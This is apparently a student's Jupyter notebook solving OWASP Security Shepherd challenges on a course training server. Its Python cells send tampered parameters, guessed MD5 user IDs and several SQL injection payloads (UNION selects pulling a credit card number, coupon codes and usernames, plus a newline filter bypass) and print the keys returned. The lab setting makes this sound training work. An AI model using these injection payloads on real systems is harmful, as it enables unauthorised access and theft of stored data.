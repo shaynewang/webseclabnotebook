{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>User: Admin</h2><table><tr><th>Age:</th><td>43</td></tr><tr><th>Address:</th><td>12 Bolton Street, Dublin</td></tr><tr><th>Email:</th><td>administratorAccount@securityShepherd.com</td></tr><tr><th>Private Message:</th><td>Result Key: <script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>eIal5mgPZr4mdSr684/oKZmR/QWPmyacr3S9hLxEtFHHhCnw0VQ+V+IgvrKn3LwN0t2LfzAOWdI7wwa5SEbF9CNV9GMZn2uQ/3MpfzkFQEc=</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div><a></a></td></tr></table>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import requests\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "payload = {'username':'admin'}\n",
    "response = session.post('http://cs410.oregonctf.org/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100',data=payload)\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>Hidden User's Message</h2><p>Result Key is <a>dd6301b38b5ad9c54b85d07c087aebec89df8b8c769d4da084a55663e6186742</a></p>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import requests\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "payload = {'userId[]':'11'}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'13'\n",
      "c51ce410c124a10e0db5e4b97fc2af39\n",
      "<h2 class='title'>Hidden User's Message</h2><p>Result Key is <a>1f746b87a4e3628b90b1927de23f6077abdbbb64586d3ac9485625da21921a0f</a></p>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import hashlib\n",
    "import requests\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "for i in range(0,20):\n",
    "    sid = \"{}\".format(i)\n",
    "\n",
    "    s = hashlib.md5()\n",
    "    s.update(sid.encode())\n",
    "    uid = s.hexdigest()\n",
    "\n",
    "    payload = {'userId[]':uid}\n",
    "    response = session.post('http://cs410.oregonctf.org/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4',data=payload)\n",
    "    if 'Result Key' in response.text:\n",
    "        print(sid.encode())\n",
    "        print(uid)\n",
    "        print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>Server Status</h2><p>We have no idea what is wrong with the server. It just keeps saying \"Result key is;<br /><a><script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>BGzD4I3PVWSbrLAEBr7ZgcQBbm/ztJ7EGb4gzo0j9AMk8s1jBMjOQnO4tKvkJeMYkmDsLEWzG0k85OjxdBi5ra1EaO222tss/7EhCvnWbIo=</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></a><br /> What does that even mean?!</p>\n",
      "<h2 class='title'>Server Status</h2><p>We have no idea what is wrong with the server. It just keeps saying \"Result key is;<br /><a><script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>BGzD4I3PVWSbrLAEBr7ZgcQBbm/ztJ7EGb4gzo0j9AMk8s1jBMjOQnO4tKvkJeMYkmDsLEWzG0k85OjxdBi5ra1EaO222tss/7EhCvnWbIo=</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></a><br /> What does that even mean?!</p>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import requests\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "payload = {'userData':'4816283'}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Failure to Restrict URL Access Challenge 2:\n",
    "From clicking around in the inspection tool I found:\n",
    "```\n",
    "...'ajaxCall|slow|resultsDiv|function|show|hide|status|loadingSign|submitButton|fast|html|url|data|async|var|submit|false|ajax|type|POST|200|An|if|Occurred|statusText||else|Error|responseText|ismcoa98sUD8j21dmdoasmcoISOdjh3189|guestData|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa|leAdministratorFormOfAwesomeness|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin|adminData|youAreAnAdminOfAwesomenessWoopWoop|leForm'.split('|'),0,{}))\n",
    "```\n",
    "clearly I need to change guestData to adminData in the payload. And from guessing the longer random string would be the\n",
    "relative url for the post request, and \"youAreAnAdminOfAwesomenessWoopWoop\" is clearly the value for the payload. Use \n",
    "these information to craft the post request and I got the key.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>Admin Button Clicked</h2><p>Hey Admin, Here is that key you are looking for: <br /> <a><script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>rBYnyosPYRWJP1yHUmB7VUbi3dbpsF9PVcimE8RTthNM08pMeXMJlq7eSXQZ4bMX0kB8bP/3/6dGJweQeobZO7CWPaW6jdqc/RDMPE+bCQzWDL5EuCf+LEbDCOTYxbLU</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></a><br />Enjoy!</p>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import requests\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "payload = {'adminData':'youAreAnAdminOfAwesomenessWoopWoop'}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Failure to Restrict URL Access Challenge 3:\n",
    "I tried get a list of users and then try each one using cookie 'currentPerson=base64(username)'. I realized all users are not valid so there might be something to do with the list itself. It appears that the sql backend checks the currentUser and thus return a different list. So I had to craft a sql injection code and insert that in the cookie, and now I get a diffent list. Try all users in that list and now I got the key."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "list of users ['aGuest', 'manager', 'sean', 'root', 'administrator', 'privileged', 'seanduggan', 'markdenihan', 'mark', 'superuser', 'MrJohnReillyTheSecond', 'megauser', 'hyperuser', 'godzilla', 'kinguser', 'rootuser', 'adminuser', 'shepherd']\n",
      "aGuest\n",
      "<h2 class='title'>You're not a Super Admin!!!</h2><p>Stay away from the super admin only section. The mighty dog beasts have been released.</p>\n",
      "manager\n",
      "<!-- Invalid User Detected -->\n",
      "sean\n",
      "<!-- Invalid User Detected -->\n",
      "root\n",
      "<!-- Invalid User Detected -->\n",
      "administrator\n",
      "<!-- Invalid User Detected -->\n",
      "privileged\n",
      "<!-- Invalid User Detected -->\n",
      "seanduggan\n",
      "<!-- Invalid User Detected -->\n",
      "markdenihan\n",
      "<!-- Invalid User Detected -->\n",
      "mark\n",
      "<!-- Invalid User Detected -->\n",
      "superuser\n",
      "<!-- Invalid User Detected -->\n",
      "MrJohnReillyTheSecond\n",
      "<h2 class='title'>Super User Only Club</h2><p>Welcome super admin! Your result key is as follows <a><script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>dOh+4RWeqFqt7a8KyY+8KdkWWizRV/sOKdGxe0l+ETKGEeSDEl1x5uBfzmgFQIilu7likn1zZR66xk1qgmDSm1Pn0ziUG+8FUVIllV3ESoYVL2R2d9aMIXZdvH0b0OhC3matGWAewyfz6z8Jg71ndA==</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></a></p>\n",
      "megauser\n",
      "<!-- Invalid User Detected -->\n",
      "hyperuser\n",
      "<!-- Invalid User Detected -->\n",
      "godzilla\n",
      "<!-- Invalid User Detected -->\n",
      "kinguser\n",
      "<!-- Invalid User Detected -->\n",
      "rootuser\n",
      "<!-- Invalid User Detected -->\n",
      "adminuser\n",
      "<!-- Invalid User Detected -->\n",
      "shepherd\n",
      "<!-- Invalid User Detected -->\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import hashlib\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "u = b'\" or \"\"=\"' #https://www.w3schools.com/sql/sql_injection.asp\n",
    "d = base64.b64encode(u)\n",
    "my_cookie = {'currentPerson':d.decode()}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList',cookies=my_cookie)\n",
    "userl = response.text.split('<br>')[:-1]\n",
    "print(\"list of users\", userl)\n",
    "for u in userl:\n",
    "    d = base64.b64encode(u.encode())\n",
    "    print(u)\n",
    "    my_cookie = {'currentPerson':d.decode()}\n",
    "    for i in range(10,11):\n",
    "        sid = \"{}\".format(i)\n",
    "        s = hashlib.md5()\n",
    "        s.update(sid.encode())\n",
    "        uid = s.hexdigest()\n",
    "\n",
    "        #print(userl)\n",
    "        payload = {'userId':uid,'secure':'true'}\n",
    "        response = session.post('http://cs410.oregonctf.org/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4',data=payload,cookies=my_cookie)\n",
    "        print(response.text)\n",
    "        if 'Result Key' in response.text:\n",
    "            print(sid.encode())\n",
    "            print(uid)\n",
    "            print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'base64isNotEncryptionBase64isEncodingBase64HidesNothingFromYou'\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "import requests\n",
    "import base64\n",
    "encrypted = \"YmFzZTY0aXNOb3RFbmNyeXB0aW9uQmFzZTY0aXNFbmNvZGluZ0Jhc2U2NEhpZGVzTm90aGluZ0Zyb21Zb3U=\"\n",
    "d = base64.b64decode(encrypted)\n",
    "print(d)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The result key for this lesson is the following string6 mylovelyhorserunningthroughthefieldwhereareyougoingwithyourbiga\n"
     ]
    }
   ],
   "source": [
    "romant = \"Ymj wjxzqy pjd ktw ymnx qjxxts nx ymj ktqqtbnsl xywnsl; rdqtajqdmtwxjwzssnslymwtzlmymjknjqibmjwjfwjdtzltnslbnymdtzwgnlf\"\n",
    "# t -> y, h -> m, e -> j \n",
    "# char >> 5\n",
    "english = ''\n",
    "for r in romant:\n",
    "    if r == ' ':\n",
    "        english+=' '\n",
    "        continue\n",
    "    if r == 'e':\n",
    "        english+='z'\n",
    "        continue\n",
    "    if r == 'd':\n",
    "        english+='y'\n",
    "        continue\n",
    "    if r == 'c':\n",
    "        english+='x'\n",
    "        continue\n",
    "    if r == 'b':\n",
    "        english+='w'\n",
    "        continue\n",
    "    if r == 'a':\n",
    "        english+='v'\n",
    "        continue\n",
    "    e = chr(ord(r)-5)\n",
    "    english+=e\n",
    "print(english)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'\n",
      "or\n",
      "1=1#@gmail.com\n",
      "<h2 class='title'>Search Results</h2><table><tr><th>Name</th></tr><tr><td>Mary Martin</td></tr><tr><td>9815 1547 3214 7569</td></tr></table>\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "\n",
    "payload = {'theUserName':\"Mary Martin' Union select CreditCardNumber from customers where customerName='mary martin'; #\"}\n",
    "\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 187,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Valid Coupon for %100 off spcil&#x2f;&#x7c;Pse3cr3etCouponStu.f4rU176 items\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "\n",
    "payload = {'couponCode':\"' UNION SELECT itemId,percentOff,couponCode FROM vipCoupons # \"}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck',data=payload)\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 238,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h3>Welcome back Brendan</h3><p>Your authentication number is now -83208726685135989001812916803559025471</p>\n",
      "<h3>Welcome back 17f999a8b3fbfde54124d6e94b256a264652e5087b14622e1644c884f8a33f82</h3><p>Your authentication number is now -101929586861856270534310663001708078648</p>\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "\n",
    "payload = {'pinNumber':'%27%20or%201%3D1%20and%20username%3D%27Brendan%27;#'}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2',data=payload)\n",
    "print(response.text)\n",
    "payload = {'pinNumber':'%27%20union%20select%20userAnswer%20from%20users%20where%20username%3D%27Brendan%27%20#'}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'd0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-145-307b2d9e8c4c>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0md0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m: name 'd0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2' is not defined"
     ]
    }
   ],
   "source": [
    "'or'1'='1'union'+chr(0x0A)+'select'+chr(0x0A)+'userName'+chr(0x0A)+'from'+chr(0x0A)+'users'+chr(0x0A)+\"where''!='\"+chr(0x40)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 211,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'or'1'='1'union\n",
      "select\n",
      "userName\n",
      "from\n",
      "users\n",
      "where''!='@v\n",
      "<h3>Welcome  User 1</h3><p>The result key for this level is <script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>45mxu55AYq4CyZCxwByXV0Un5Q8sRxD/DA34LG8ii+AiQT6eakqbh4bZ8y5eu9AVaH6HzBwUT3q0PTVRlSDTBf55c4ewYI6OyGNiHPSJ9gZdcGODoWzPnd2KmBeSOt7e7cwRPb5C6qwdch35SncLlQ==</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></p>\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "\n",
    "email = \"'or'1'='1'union\"+chr(0x0A)+'select'+chr(0x0A)+'userName'+chr(0x0A)+'from'+chr(0x0A)+'users'+chr(0x0A)+\"where''!='\"+chr(0x40)+'v'\n",
    "print(email)\n",
    "payload = {'subEmail':email,'subPassword':\"123\"}\n",
    "\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/8c2dd7e9818e5c6a9f8562feefa002dc0e455f0e92c8a46ab0cf519b1547eced',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 286,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>Login Result</h2><p>Signed in as admin</p><p>As you are the admin, here is the result key:<a>d316e80045d50bdf8ed49d48f130b4acf4a878c82faef34daff8eb1b98763b6f</a>\n"
     ]
    }
   ],
   "source": [
    "import hashlib\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "\n",
    "\n",
    "payload = {'theUserName':'\\\\','thePassword':' or 1!=1 UNION SELECT username FROM users where idusers=7#'}\n",
    "\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/1feccf2205b4c5ddf743630b46aece3784d61adc56498f7603ccd7cb8ae92629',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
